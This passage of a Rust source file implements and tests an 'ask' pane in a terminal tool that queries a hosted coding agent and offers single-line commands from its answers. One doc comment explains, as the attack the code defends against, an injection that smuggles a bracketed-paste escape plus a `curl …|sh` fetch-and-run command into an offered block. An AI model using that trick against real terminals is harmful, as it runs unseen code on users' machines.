    fn handle_mouse(&mut self, ev: &MouseEvent) -> Result<Handled> {
        if self.ready().is_err() {
            return Ok(Handled::No);
        }
        let handled = self.scroll.mouse(ev).unwrap_or(Handled::No);
        // The wheel is the other way the reader takes themselves off the
        // bottom, and it has to stop the follow exactly as the arrows do.
        self.settle_follow();
        Ok(handled)
    }

    /// `Alt+J`/`Alt+K`/`Alt+PgDn`/`Alt+PgUp`, arriving as the bare key.
    ///
    /// The trait's default declines on a pane that takes typing, and it is
    /// right to: a bare `Down` here belongs to whatever is hosted. This pane
    /// takes typing *and* scrolls, so it says how — the glance moves the view
    /// and touches neither the draft nor the command selection, which is the
    /// whole point of a binding that costs no focus round trip.
    fn scroll_key(&mut self, key: KeyEvent) -> Result<Handled> {
        if self.ready().is_err() {
            return Ok(Handled::No);
        }
        Ok(self.scroll_only(key).unwrap_or(Handled::No))
    }

    /// True whenever there is a composer, which is whenever the pane is
    /// available.
    ///
    /// A question about this instant, per the trait docs, and here the instant
    /// that matters is the one where there is nothing to ask: an unavailable
    /// ask has no composer, takes nothing and claims no key at all — the one
    /// state of this pane in which `q` is the shell's rather than a letter
    /// pushed into a question. Not `Esc`, which the doc below is three-valued
    /// about: an empty composer falls that one through as well.
    fn takes_input(&self) -> bool {
        self.ready().is_ok()
    }

    /// Three answers, and the border has to be true in every one because it is
    /// the only place the way out is written down.
    ///
    /// With something typed, `Esc` throws the draft away and leaves you here,
    /// one press short of the agent — so the border must not promise otherwise,
    /// and `esc→clear` is the word the viewer's search already uses for exactly
    /// that press. With nothing typed it falls through and the shell hands
    /// focus back, which is `esc→agent`. And an unavailable ask claims no keys
    /// at all, so `Esc` there is the shell's from the first press.
    ///
    /// The middle answer is the one a two-valued version of this would get
    /// wrong: [`Pane::takes_input`] is true both while there is a draft and
    /// while there is not, because the composer is live either way.
    fn exit_hint(&self) -> &'static str {
        if self.ready().is_ok() && !self.composing.is_empty() {
            "esc→clear"
        } else {
            "esc→agent"
        }
    }

    fn cursor(&self) -> Option<(u16, u16)> {
        if self.ready().is_err() || self.drawn.width == 0 || self.drawn.height == 0 {
            return None;
        }
        // The composer is the last row of the pane by construction — see
        // [`AskPane::foot`] — so this needs no second copy of the layout.
        let (_, col) = self.composer_view(self.drawn.width as usize);
        Some((
            (col as u16).min(self.drawn.width - 1),
            self.drawn.height - 1,
        ))
    }

    /// A pasted block becomes part of the question.
    ///
    /// The fastest way to get a real question in: a stack trace, an error, a
    /// paragraph out of the agent's transcript. It goes in whole, newlines
    /// included, because that is the one thing this shape of child can carry
    /// that `crate::dispatch`'s cannot.
    fn handle_paste(&mut self, text: &str) -> Result<Handled> {
        if self.ready().is_err() {
            return Ok(Handled::No);
        }
        // A Windows paste arrives with CRLF in it, and this text is on its way
        // into a JSON string.
        let text = text.replace("\r\n", "\n").replace('\r', "\n");
        if text.is_empty() {
            return Ok(Handled::No);
        }
        self.composing.push_str(&text);
        Ok(Handled::Yes)
    }
}

// ---------------------------------------------------------------------------
// availability
// ---------------------------------------------------------------------------

/// Is there a Claude to ask, and where is it?
///
/// The same walk `crate::dispatch::Dispatcher::new` does, and deliberately the
/// same shape rather than a call into it: what that type resolves is a program
/// to run `--bg` with, and what this resolves is a program to run
/// `--input-format stream-json` with. They are the same executable today and
/// two different questions, and the day one of them moves the other must not
/// silently follow.
///
/// With no arguments, for `Dispatcher::new`'s reason: what is being asked is
/// whether there is a Claude at all, and the answer has to arrive while the
/// pane is being built rather than on the keystroke that asks a question.
fn resolve(agent: &str) -> Result<Ready, Unavailable> {
    // Through the table rather than by comparing the string, so `abeam +Claude`
    // and `abeam +claude` are one request here as they are everywhere else. A
    // program named outright — `abeam +C:\tools\claude.exe` — is not the
    // table's Claude and does not become it.
    let Some((found, flavour)) = crate::agent::find(agent).and_then(|found| {
        ASKABLE
            .iter()
            .find(|(name, _)| *name == found.name)
            .map(|(_, flavour)| (found, *flavour))
    }) else {
        return Err(Unavailable(elsewhere(agent)));
    };
    let mut why = String::new();
    for candidate in found.candidates {
        match launch::resolve(candidate, &[]) {
            Ok(launch) => return Ok(Ready { launch, flavour }),
            Err(reason) => why = reason,
        }
    }
    // And that is the end of the search. Nothing on this path fetches anything;
    // `crate::agent`'s module docs record the route that was written for exactly
    // this problem and then deliberately taken out again.
    Err(Unavailable(missing(found, &why)))
}

/// What abeam says to a session that is hosting something else.
///
/// It names the agent in front of the reader, because "ask is unavailable" with
/// no subject reads as a bug in abeam rather than as a fact about the agent
/// being hosted. And it names what is still there, because losing this pane is
/// not losing the ability to ask a question — it is losing the ability to ask
/// one *without spending the conversation on the left*.
fn elsewhere(agent: &str) -> String {
    let known: Vec<String> = ASKABLE
        .iter()
        .map(|(name, _)| format!("`{name}`"))
        .collect();
    format!(
        "abeam is hosting `{agent}`, and this pane is a second copy of the agent \
         you are already talking to — started in whatever print mode that agent \
         publishes, with its writing tools taken away. abeam knows two: {}. \
         `{agent}` is neither, and abeam will not quietly start an agent you did \
         not ask for — it hosts the one you named. The question can still be \
         asked of the session in the left pane, which is the agent you chose.",
        known.join(" and ")
    )
}

/// What abeam says when the agent it is hosting is not on the machine.
///
/// The same standard `crate::agent::missing` is held to — every candidate by
/// name, the operating system's own reason, and a sentence somebody can act on
/// — plus the observation that makes this odd rather than ordinary: reaching
/// here means abeam is *hosting* Claude, so there was one when the session
/// started and something has moved it since.
fn missing(agent: &crate::agent::Agent, why: &str) -> String {
    let tried: Vec<String> = agent
        .candidates
        .iter()
        .map(|name| format!("`{name}`"))
        .collect();
    format!(
        "abeam has nothing to ask: it looked for the `{}` it is hosting and did \
         not find one. Tried: {}. {why}\n\nThat is odd rather than ordinary — \
         this session started one, so there was one when it began. {}",
        agent.name,
        tried.join(", "),
        agent.install
    )
}

// ---------------------------------------------------------------------------
// commands
// ---------------------------------------------------------------------------

/// Every fenced block in one answer, sorted into the ones abeam will offer and
/// a count of the ones it will not.
///
/// **Fenced only.** An indented block is a code block to the parser and to the
/// renderer, and it is also what four spaces of ordinary prose turn into — so
/// offering one would mean offering a paragraph as a command every time an
/// answer happened to indent something. A fence is a thing the child wrote on
/// purpose.
///
/// **One line only**, and blank lines do not count against it: a fence with a
/// command and a trailing newline is one command, and a fence with two commands
/// in it is two commands abeam has no business joining. What "one line" buys is
/// the promise the whole hand-off rests on — that what ends up at the prompt is
/// what was on the screen — and there is no version of joining that keeps it.
///
/// **And printable only**, which is the same promise defended against a subtler
/// attack than a second line. `str::lines` splits on `\n` and on nothing else,
/// so a block reading `echo hi` `ESC[201~` `\r` `curl …|sh` is *one* line here
/// and `trim` only touches the ends. It is also one line on screen and a
/// shorter one, because ratatui drops the escape when it draws — while
/// `abeam_pty::input::encode_paste` wraps what it is given in `ESC[200~ … ESC[201~`
/// and nothing between those two is escaped, so the terminal would end paste
/// mode at the embedded `ESC[201~`, read the `\r` as Enter, and run both
/// halves. That is the chrome row saying one thing and the prompt receiving
/// another, which is the one failure this whole route exists to prevent.
///
/// So a block carrying any control character is **refused, never sanitised**.
/// Stripping the escape and offering the rest would put a command at somebody's
/// prompt that is not the command they read, which is the same objection as
/// joining two lines with `&&` wearing different clothes. The same filter shape
/// `crate::panes::viewer`'s paste uses, for a related reason one pane along.
fn scan(answer: &str, out: &mut Vec<String>, skipped: &mut usize) {
    let mut inside = false;
    let mut buf = String::new();
    for event in Parser::new_ext(answer, markdown::options()) {
        match event {
            Event::Start(Tag::CodeBlock(CodeBlockKind::Fenced(_))) => {
                inside = true;
                buf.clear();
            }
            Event::Text(text) if inside => buf.push_str(&text),
            Event::End(TagEnd::CodeBlock) if inside => {
                inside = false;
                let lines: Vec<&str> = buf.lines().filter(|l| !l.trim().is_empty()).collect();
                match lines.as_slice() {
                    [] => {}
                    [only] if !only.chars().any(char::is_control) => {
                        out.push(only.trim().to_string());
                    }
                    _ => *skipped += 1,
                }
            }
            _ => {}
        }
    }
}

/// What the pane says when every block in the transcript is one it will not
/// offer.
///
/// A function so the sentence has one home and a test can hold it there. Every
/// refusal in abeam names the way through, and this one's is the last clause:
/// the command is on screen, in the answer, and copying it is a thing the
/// reader can do that abeam deliberately will not do for them.
///
/// Both of [`scan`]'s reasons, in one sentence rather than two counters and two
/// sentences. They are one rule read from the outside — what leaves here is one
/// line of printable text or nothing — and a reader who has just pressed `tab`
/// and got nothing needs the way through rather than a taxonomy of why.
fn refusal(skipped: usize) -> String {
    format!(
        "{COMMAND}{skipped} {} not offered: a block travels only when it is one \
         line and holds nothing but printable text. Joining lines, or typing an \
         escape the screen does not show, would put something at your prompt \
         that nobody read — copy it out of the answer above.",
        plural(skipped, "block is", "blocks are")
    )
}

/// What a finished turn cost, in the two currencies a reader is spending.
///
/// Time first, because it is the one they have already paid and the one they
/// were wondering about while they waited. `None` when the child reported
/// neither, which is a turn that failed early.
fn spent(x: &Exchange) -> Option<String> {
    match (x.duration_ms.map(took), x.cost_usd) {
        (Some(time), Some(cost)) => Some(format!("{time} · ${cost:.4}")),
        (Some(time), None) => Some(time),
        (None, Some(cost)) => Some(format!("${cost:.4}")),
        (None, None) => None,
    }
}

/// A duration as somebody who just waited through it would say it.
fn took(ms: u64) -> String {
    let secs = ms / 1000;
    if secs < 60 {
        format!("{secs}s")
    } else {
        format!("{}m {:02}s", secs / 60, secs % 60)
    }
}

/// Fold the `result` line's text into the answer, **without ever deleting what
/// streamed**.
///
/// This function is a bug fix with a measurement behind it, and the measurement
/// is the reason it is four lines with a page of comment rather than the one
/// line it replaced. That line was `x.answer = text`, on the belief that the
/// `result` carries the whole answer and the fragments carry it in pieces, so
/// the complete one should win.
///
/// **The `result` line does not carry the whole answer. It carries the last
/// text block of the turn.** Probed on 2026-08-09 against 2.1.222, twice: the
/// fragments streamed 1144 and 2449 characters and the `result` reported 944
/// and 2278. Both times the model said something before it reached for a tool —
/// "I'll look at the file first" — and both times `result` began after the last
/// tool call. So the assignment did not prefer a better copy; it deleted the
/// opening of every answer that used a tool, which is most answers worth
/// asking for.
///
/// At its worst it deleted all of them. A turn whose last block is an apology —
/// and plan mode used to manufacture exactly that, see
/// `crate::ask::PERMISSION_MODE` — left a reader who had watched three
/// paragraphs arrive holding one sentence about why there was no answer.
///
/// So the streamed text is authoritative whenever there is any, and the three
/// cases are:
///
/// - **Nothing streamed.** The `result` is the entire answer — the fallback
///   `crate::ask::proto` describes for a session where
///   `--include-partial-messages` was not honoured — and it is taken whole.
/// - **The `result` is how the streamed text ends**, which is the ordinary
///   case. Nothing to do: the reader already has it, and appending would draw
///   the last paragraph twice.
/// - **Neither**, which means fragments went missing. It is appended rather
///   than substituted, because a duplicated overlap is a thing a reader can see
///   past and a deleted answer is not.
fn finish(x: &mut Exchange, text: String) {
    let said = text.trim();
    // An empty `result` is the ordinary shape of a failed turn, and of a turn
    // that streamed four paragraphs and then reported no text. Either way abeam
    // already holds whatever there is.
    if said.is_empty() {
        return;
    }
    if !x.streamed {
        x.answer = text;
        return;
    }
    if x.answer.trim_end().ends_with(said) {
        return;
    }
    if !x.answer.trim().is_empty() {
        x.answer.push_str("\n\n");
    }
    x.answer.push_str(said);
}

/// Anything that has to survive being put inside a block quote, or on one row
/// of chrome, with its newlines taken out rather than its meaning.
fn one_line(text: &str) -> String {
    text.split_whitespace().collect::<Vec<_>>().join(" ")
}

// ---------------------------------------------------------------------------
// tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use ratatui::Terminal;
    use ratatui::backend::TestBackend;

    /// A `Launch` that could exist on this platform, fabricated rather than
    /// found — what is under test is the pane, and whether the machine running
    /// it has Claude installed is not a property a test may have. Nothing here
    /// ever starts it: `crate::ask::AskSession` is the app's, and this pane
    /// holds the answer to "is there one" and nothing else.
    fn fake_launch() -> Launch {
        #[cfg(windows)]
        let exe = PathBuf::from(r"C:\Users\someone\.local\bin\claude.exe");
        #[cfg(unix)]
        let exe = PathBuf::from("/home/someone/.local/bin/claude");
        Launch {
            program: exe.clone(),
            target: exe,
            args: Vec::new(),
            env: Vec::new(),
        }
    }

    fn live() -> AskPane {
        AskPane::with_launch(PathBuf::from("/repo"), Flavour::Claude, Ok(fake_launch()))
    }

    fn unavailable(why: &str) -> AskPane {
        AskPane::with_launch(
            PathBuf::from("/repo"),
            Flavour::Claude,
            Err(Unavailable(why.to_string())),
        )
    }

    fn key(code: KeyCode) -> KeyEvent {
        KeyEvent::new(code, KeyModifiers::NONE)
    }

    fn ctrl(code: KeyCode) -> KeyEvent {
        KeyEvent::new(code, KeyModifiers::CONTROL)
    }

    fn wheel_up() -> MouseEvent {
        MouseEvent {
            kind: crossterm::event::MouseEventKind::ScrollUp,
            column: 0,
            row: 0,
            modifiers: KeyModifiers::NONE,
        }
    }

    fn typed(p: &mut AskPane, text: &str) {
        for c in text.chars() {
            p.handle_key(key(KeyCode::Char(c))).expect("a letter");
        }
    }

    /// Render one frame and flatten it, so a test can ask what is on screen
    /// rather than what the code meant to put there.
    fn screen(p: &mut AskPane, w: u16, h: u16) -> String {
        let mut term = Terminal::new(TestBackend::new(w, h)).expect("a test terminal");
        term.draw(|f| p.render(f, Rect::new(0, 0, w, h)))
            .expect("draw the ask");
        term.backend()
            .buffer()
            .content()
            .iter()
            .map(|c| c.symbol())
            .collect()
    }

    /// Ask a question and drain it, the way the app does.
    fn ask(p: &mut AskPane, question: &str) -> Option<String> {
        typed(p, question);
        p.handle_key(key(KeyCode::Enter)).expect("enter sends");
        p.take_question()
    }

    fn answer(p: &mut AskPane, text: &str) {
        p.on_event(AskEvent::Delta(text.to_string()));
        p.on_event(AskEvent::Turn {
            text: text.to_string(),
            cost_usd: Some(0.01),
            duration_ms: None,
            error: None,
        });
    }

    // --- there is nothing to ask ------------------------------------------

    #[test]
    fn an_unavailable_ask_draws_the_reason_and_takes_nothing_at_all() {
        let mut p = unavailable("copilot has no streaming-JSON print mode");

        // The notice where somebody looking for the missing feature will read
        // it — above the body, not below whatever has scrolled past — and the
        // whole reason under it.
        let text = screen(&mut p, 60, 14);
        assert!(text.contains("ask unavailable"), "{text}");
        assert!(text.contains("streaming-JSON"), "{text}");
        assert_eq!(p.title(), "ask · unavailable");

        // Not one key is claimed, which is what makes `Esc` and `q` reach the
        // shell as "the user is done with this pane" — the only way out of a
        // pane that can do nothing.
        for code in [
            KeyCode::Esc,
            KeyCode::Enter,
            KeyCode::Tab,
            KeyCode::Char('a'),
            KeyCode::Char('q'),
            KeyCode::Backspace,
            KeyCode::Down,
        ] {
            assert_eq!(p.handle_key(key(code)).unwrap(), Handled::No, "{code:?}");
        }
        assert_eq!(p.handle_paste("a question").unwrap(), Handled::No);
        assert_eq!(p.handle_mouse(&wheel_up()).unwrap(), Handled::No);
        assert!(
            !p.takes_input(),
            "it says typing goes into it, with no composer to put any in"
        );
        assert_eq!(p.cursor(), None, "and there is nothing to type into");
        assert_eq!(p.exit_hint(), "esc→agent");
        assert_eq!(p.take_question(), None);
        assert_eq!(p.launch(), None);

        // It draws at every size a split can produce, including the ones with
        // no room for any of it.
        for w in [1u16, 2, 8, 24, 46] {
            for h in [1u16, 2, 3, 30] {
                screen(&mut p, w, h);
            }
        }
    }

    #[test]
    fn whether_there_is_a_claude_is_asked_on_the_first_frame_and_not_before() {
        // `resolve` is a full PATH and PATHEXT walk, and `App::sync_workspaces`
        // builds one of these per newly discovered worktree on the thread that
        // draws — measured at 50.1 ms of a 51 ms stall for eight worktrees,
        // beside a `ShellPane::new` costing 39 µs. A workspace nobody asks in
        // pays nothing.
        let mut p = AskPane::new(PathBuf::from("/repo"), "claude");
        assert!(
            p.ready.get().is_none(),
            "the machine was walked to build a pane nobody has drawn"
        );

        // ...and the pane can still say on the first frame it draws whether
        // there is anything to ask, which is what resolving early was for.
        screen(&mut p, 40, 8);
        assert!(p.ready.get().is_some(), "the first frame did not find out");

        // Once, and then remembered: a walk per frame would be a worse bug than
        // the one this replaced.
        let decided = std::ptr::from_ref(p.ready.get().expect("resolved"));
        screen(&mut p, 40, 8);
        assert!(std::ptr::eq(
            decided,
            p.ready.get().expect("still resolved")
        ));
    }

    #[test]
    fn only_an_agent_with_a_print_mode_can_be_asked_and_the_rest_are_told_why() {
        // [`ASKABLE`] is deliberately narrower than `crate::agent::AGENTS`:
        // Codex is a supported interactive host, but has no Ask integration in
        // this release. Programs abeam does not know reach the same refusal.
        // Each is a session with no print-mode adapter to drive, and the pane
        // has to say which one and offer the way through.
        for hosting in [
            "codex",
            "Codex",
            "CODEX",
            "pwsh",
            "bash",
            "not-an-agent",
        ] {
            let Unavailable(why) = resolve(hosting).expect_err("this pane knows two");
            assert!(why.contains(hosting), "the agent in front of them: {why}");
            // Both of the ones that would have worked, named rather than
            // implied: a reader whose agent cannot be asked is exactly the
            // reader who wants to know which can.
            assert!(why.contains("`claude`"), "{why}");
            assert!(why.contains("`copilot`"), "{why}");
            // The reversal `crate::agent` records, in the place it would be
            // easiest to undo quietly.
            assert!(why.contains("did not ask for"), "{why}");
            // And the way through: the agent they chose can still be asked.
            assert!(why.contains("left pane"), "{why}");
        }

        // Whether either then resolves is a fact about the machine rather than
        // a decision, so what is asserted is that the spellings are one
        // question — and that the answer is never the refusal meant for
        // something this pane cannot drive at all.
        let answer = |name: &str| match resolve(name) {
            Ok(_) => "it is installed",
            Err(Unavailable(why)) => {
                assert!(
                    !why.contains("is hosting `"),
                    "read as another agent: {why}"
                );
                assert!(why.contains("Tried:"), "{why}");
                "it is not installed"
            }
        };
        assert_eq!(answer("claude"), answer("Claude"));
        assert_eq!(answer("claude"), answer("CLAUDE"));
        assert_eq!(answer("copilot"), answer("Copilot"));
        assert_eq!(answer("copilot"), answer("COPILOT"));

        // And the shape follows the name rather than the machine. Guarded
        // rather than asserted outright because whether either program is on
        // *this* machine is not a property a test may have — what must never
        // happen is a resolve that finds one agent and drives it as the other,
        // which is a session started with flags it has never heard of.
        if let Ok(ready) = resolve("Claude") {
            assert_eq!(ready.flavour, Flavour::Claude);
        }
        if let Ok(ready) = resolve("Copilot") {
            assert_eq!(ready.flavour, Flavour::Copilot);
        }
    }

    #[test]
    fn a_copilot_pane_never_shows_a_tool_list_it_was_not_given() {
        // The one promise this pane makes that Copilot cannot keep, kept the
        // only way left: by saying so. The capability row is the child's answer
        // and never abeam's intention — and against Copilot there is no answer,
        // because it publishes no line announcing what it was given. What must
        // never appear on that row is `--deny-tool`'s list, which would read as
        // a confirmation of something nothing has confirmed.
        let mut p =
            AskPane::with_launch(PathBuf::from("/repo"), Flavour::Copilot, Ok(fake_launch()));
        let row = screen(&mut p, 46, 12);
        assert!(row.contains("no tool list"), "got: {row}");
        for named in ["deny", "shell", "web_fetch", "Read Grep Glob"] {
            assert!(
                !row.contains(named),
                "`{named}` was drawn as though a child had reported it: {row}"
            );
        }

        // The opening screen is where the whole of it is said, because it is the
        // one screen with room — including the sentence that governs how the
        // rest of this feature should be read.
        let doc = p.source();
        assert!(doc.contains("Copilot"), "which agent: {doc}");
        assert!(
            doc.contains("ever been run"),
            "the caveat is the point: {doc}"
        );
        assert!(doc.contains("copilot -p"), "how it is driven: {doc}");
        // The tools it is refused, which the *screen* may name because it says
        // in the same breath that this is what abeam asked for rather than what
        // was granted.
        assert!(doc.contains("`shell`"), "{doc}");
        assert!(
            doc.contains("cannot show you the tools it actually got"),
            "{doc}"
        );

        // And a Claude pane is unchanged by any of it.
        let claude = live().source();
        assert!(claude.contains("`Read`, `Grep` and `Glob`"), "{claude}");
        assert!(!claude.contains("ever been run"), "{claude}");
    }

    // --- the transcript ----------------------------------------------------

    #[test]
    fn an_empty_pane_explains_itself_without_warning_anybody_about_the_bill() {
        // A blank box is indistinguishable from a broken one, and this pane is
        // empty the first time anybody opens it.
        let mut p = live();
        assert_eq!(p.title(), "ask");
        // Phrases against the document, single words against the frame: the
        // prose is wrapped, so a phrase reads perfectly well on screen while
        // being split across two rows of a flattened buffer.
        let doc = p.source();
        assert!(doc.contains("can read this repository"), "{doc}");
        assert!(doc.contains("without running it"), "the promise: {doc}");
        assert!(doc.contains("nobody read"), "and why: {doc}");

        // It is the same Claude, started by the same person, on the same
        // account. A standing caution about that reads as though abeam had
        // found something to be alarmed about, and there is nothing here to be
        // alarmed about — so the word does not appear on this pane at all.
        assert!(!doc.contains("quota"), "the pane is warning about the bill: {doc}");
        let text = screen(&mut p, 70, 24);
        assert!(!text.contains("quota"), "{text}");

        // What *is* said about cost is the part somebody can act on: a
        // conversation left open is re-sent as context and so goes on being
        // paid for, and there is a key for that.
        assert!(doc.contains("ctrl+l"), "the way to stop paying for it: {doc}");
        assert!(text.contains("Glob"), "{text}");
        // Not offered over an empty pane, where it would do nothing.
        assert!(!text.contains(CLEAR), "{text}");
        assert!(p.launch().is_some(), "it resolved something to start");
    }

    #[test]
    fn clearing_ends_the_conversation_rather_than_only_the_rows_showing_it() {
        // The point of the key. What costs money is the context the child is
        // holding, not the rows on screen — every turn is sent again with the
        // next one — so a clear that emptied the pane and kept the child would
        // hide the evidence and leave the bill.
        let mut p = live();
        ask(&mut p, "what does this file do?");
        answer(
            &mut p,
            "It parses `stream-json`.\n\n```sh\ncargo test ask\n```\n",
        );
        p.sync();
        assert!(!p.entries.is_empty());
        assert_eq!(p.commands, ["cargo test ask"]);
        assert!(screen(&mut p, 70, 24).contains(CLEAR), "the key is offered");

        assert_eq!(
            p.handle_key(KeyEvent::new(KeyCode::Char('l'), KeyModifiers::CONTROL))
                .expect("ctrl+l"),
            Handled::Yes
        );

        assert!(p.entries.is_empty(), "the transcript survived the clear");
        assert!(
            p.commands.is_empty(),
            "a command from the old answer is still offered"
        );
        assert!(
            p.take_reset(),
            "the pane cleared itself and left the child running, which is the \
             one thing this key exists to prevent"
        );
        assert!(!p.take_reset(), "a reset acted on once is acted on once");

        // The tool list goes back to unknown, because there is no child now and
        // a row still reading `Read Grep Glob` would describe a process that
        // does not exist.
        assert!(p.tools.is_none());
        assert!(screen(&mut p, 70, 24).contains("no reader yet"));
    }

    #[test]
    fn clearing_keeps_the_draft_and_the_file_the_reader_attached() {
        // Two intentions, and only one of them was expressed. Someone who has
        // typed half a question and then decides to start the conversation
        // afresh has not asked to lose what they typed — and they pressed `?`
        // on a file, so starting again means starting again *about that file*.
        let mut p = live();
        ask(&mut p, "first");
        answer(&mut p, "an answer");
        p.sync();
        p.attach(Some(AskContext {
            label: "viewer.rs".to_string(),
            path: PathBuf::from("/repo/crates/abeam/src/panes/viewer.rs"),
        }));
        for c in "half a question".chars() {
            p.handle_key(key(KeyCode::Char(c))).expect("a letter");
        }

        p.handle_key(KeyEvent::new(KeyCode::Char('l'), KeyModifiers::CONTROL))
            .expect("ctrl+l");

        assert_eq!(p.composing, "half a question");
        assert_eq!(
            p.context.as_ref().map(|c| c.label.as_str()),
            Some("viewer.rs")
        );
        assert!(p.entries.is_empty());
    }

    #[test]
    fn a_question_and_the_answer_arriving_under_it_are_both_on_screen() {
        let mut p = live();
        assert_eq!(
            ask(&mut p, "what does resolve do?").as_deref(),
            Some("what does resolve do?")
        );

        // The question is drawn before anything has come back, because a
        // question with nothing under it is the state every question passes
        // through and a blank pane there reads as a hang.
        let text = screen(&mut p, 60, 16);
        assert!(text.contains("what does resolve do?"), "{text}");
        assert_eq!(p.title(), "ask · answering");

        p.on_event(AskEvent::Delta("It walks ".to_string()));
        p.on_event(AskEvent::Delta("the table.".to_string()));
        let text = screen(&mut p, 60, 16);
        assert!(text.contains("It walks the table."), "{text}");

        p.on_event(AskEvent::Turn {
            text: "It walks the table.".to_string(),
            cost_usd: Some(0.0544),
            duration_ms: None,
            error: None,
        });
        assert_eq!(p.title(), "ask · 1 turn · $0.054");
        // Per turn as well as in total: the title cannot say which question was
        // the expensive one.
        assert!(screen(&mut p, 60, 16).contains("0.0544"));
    }

    #[test]
    fn a_hundred_deltas_between_two_frames_cost_one_layout_and_not_a_hundred() {
        // The whole reason the cache is keyed on a revision rather than being a
        // bare dirty flag checked per delta. A frame re-renders the agent's
        // entire screen and a layout re-wraps the whole transcript; doing
        // either per fragment would put a streaming answer on the frame path a
        // hundred times a second.
        let mut p = live();
        ask(&mut p, "tell me a long story");
        screen(&mut p, 60, 16);
        let before = p.builds;

        for i in 0..100 {
            p.on_event(AskEvent::Delta(format!("fragment {i} ")));
        }
        assert_eq!(p.builds, before, "a delta laid the transcript out");
        screen(&mut p, 60, 16);
        assert_eq!(p.builds, before + 1, "the frame paid for all hundred");

        // ...and a frame that changes nothing pays nothing.
        screen(&mut p, 60, 16);
        assert_eq!(p.builds, before + 1);
        // A new width is a new layout, because the rows are wrapped to it.
        screen(&mut p, 40, 16);
        assert_eq!(p.builds, before + 2);
    }

    #[test]
    fn nothing_the_reader_threads_say_is_ever_silently_dropped() {
        let mut p = live();
        ask(&mut p, "hello");
        answer(&mut p, "hi");

        p.on_event(AskEvent::RateLimited("resets at 14:00".to_string()));
        p.on_event(AskEvent::Broke("not JSON: <html>".to_string()));
        let doc = p.source();
        assert!(doc.contains("resets at 14:00"), "{doc}");
        // Said plainly, and without a paragraph about whose account this is.
        // A rate limit is news about the account rather than about this pane —
        // it is the same one the agent in the left pane is using — and the
        // reader is looking for when it lifts, which is the part the child
        // said.
        assert!(!doc.contains("quota"), "a lecture about the bill: {doc}");
        assert!(doc.contains("could not read a line"), "{doc}");
        let text = screen(&mut p, 70, 30);
        assert!(text.contains("14:00"), "and it is drawn: {text}");

        // The child going away is said once, with the way back on it.
        p.on_event(AskEvent::Ended);
        p.on_event(AskEvent::Ended);
        let doc = p.source();
        assert_eq!(
            doc.matches("the reader has gone").count(),
            1,
            "said twice: {doc}"
        );
        assert!(doc.contains("Asking again starts a fresh one"), "{doc}");
        // And the row along the bottom stops claiming a live tool list. Chrome
        // is clipped rather than wrapped, so a phrase there is contiguous.
        let text = screen(&mut p, 70, 30);
        assert!(text.contains("ask again to restart"), "{text}");
    }

    #[test]
    fn an_empty_result_never_blanks_an_answer_that_already_streamed() {
        // The one place two sources of the same text can disagree. A turn that
        // streamed four paragraphs and then reported none has an answer abeam
        // already holds, and taking the empty one would throw away the only
        // copy.
        let mut p = live();
        ask(&mut p, "what?");
        p.on_event(AskEvent::Delta("the whole answer".to_string()));
        p.on_event(AskEvent::Turn {
            text: String::new(),
            cost_usd: None,
            duration_ms: None,
            error: Some("stopped early".to_string()),
        });
        let text = screen(&mut p, 70, 20);
        assert!(text.contains("the whole answer"), "{text}");
        assert!(
            text.contains("stopped early"),
            "the reason is kept too: {text}"
        );
    }

    #[test]
    fn a_result_never_deletes_the_answer_that_streamed() {
        // The bug this pane shipped with, and it is worth stating as a
        // measurement rather than as a principle because the code it replaced
        // was written from a plausible principle. Probed twice on 2026-08-09:
        // the fragments carried 1144 and 2449 characters and the `result` line
        // reported 944 and 2278, because `result` is the *last text block* of a
        // turn and both answers said something before reaching for a tool.
        // `x.answer = text` therefore did not prefer a better copy — it deleted
        // the opening of every answer that used one.
        let mut p = live();
        ask(&mut p, "what does this do?");
        p.on_event(AskEvent::Delta("I'll read the file first.\n\n".to_string()));
        p.on_event(AskEvent::Using(vec![Step {
            tool: "Read".to_string(),
            target: Some("/repo/crates/abeam/src/scroll.rs".to_string()),
        }]));
        p.on_event(AskEvent::Delta("It scrolls by physical row.".to_string()));
        p.on_event(AskEvent::Turn {
            text: "It scrolls by physical row.".to_string(),
            cost_usd: Some(0.1634),
            duration_ms: Some(30_652),
            error: None,
        });

        let doc = p.source();
        assert!(
            doc.contains("I'll read the file first."),
            "the opening paragraph was deleted by the result line: {doc}"
        );
        // And exactly once: the `result` repeating what the fragments already
        // drew is the ordinary case, and appending it would draw the last
        // paragraph twice.
        assert_eq!(
            doc.matches("It scrolls by physical row.").count(),
            1,
            "the last block was drawn twice: {doc}"
        );
        // What it cost, in the two currencies — the time first, because that is
        // the one the reader has already spent.
        assert!(doc.contains("`30s · $0.1634`"), "{doc}");

        // Fragments that went missing — a delta shape the parser stopped
        // understanding — leave a `result` that is not how the streamed text
        // ends. It is appended rather than substituted: a duplicated overlap is
        // something a reader can see past, and a deleted answer is not.
        let mut p = live();
        ask(&mut p, "and this?");
        p.on_event(AskEvent::Delta("half an answer".to_string()));
        p.on_event(AskEvent::Turn {
            text: "a different ending".to_string(),
            cost_usd: None,
            duration_ms: None,
            error: None,
        });
        let doc = p.source();
        assert!(doc.contains("half an answer"), "{doc}");
        assert!(doc.contains("a different ending"), "{doc}");

        // The break the wire does not carry, which only became visible once the
        // answer stopped being deleted. Two text blocks either side of a tool
        // call are two messages and their fragments arrive with nothing between
        // them, so concatenation produces `first.Ctrl+U is` — which is what a
        // replay of the captured probe produced the first time it was run
        // through this pane.
        let mut p = live();
        ask(&mut p, "?");
        p.on_event(AskEvent::Delta("I'll look at the file first.".to_string()));
        p.on_event(AskEvent::Using(vec![Step {
            tool: "Read".to_string(),
            target: None,
        }]));
        p.on_event(AskEvent::Delta("Ctrl+U is already bound.".to_string()));
        let doc = p.source();
        assert!(
            doc.contains("first.\n\nCtrl+U"),
            "two messages ran into one sentence: {doc}"
        );
        // And a fragment that already ended a paragraph does not get a second
        // blank line for it.
        let mut p = live();
        ask(&mut p, "?");
        p.on_event(AskEvent::Delta("One.\n\n".to_string()));
        p.on_event(AskEvent::Thinking);
        p.on_event(AskEvent::Delta("Two.".to_string()));
        assert!(p.source().contains("One.\n\nTwo."), "{}", p.source());

        // And the fallback the whole design leans on is untouched: with nothing
        // streamed — which is what `--include-partial-messages` not being
        // honoured looks like — the `result` is the entire answer.
        let mut p = live();
        ask(&mut p, "anything?");
        p.on_event(AskEvent::Turn {
            text: "the entire answer, in one piece".to_string(),
            cost_usd: None,
            duration_ms: None,
            error: None,
        });
        assert!(p.source().contains("the entire answer, in one piece"));
    }

    #[test]
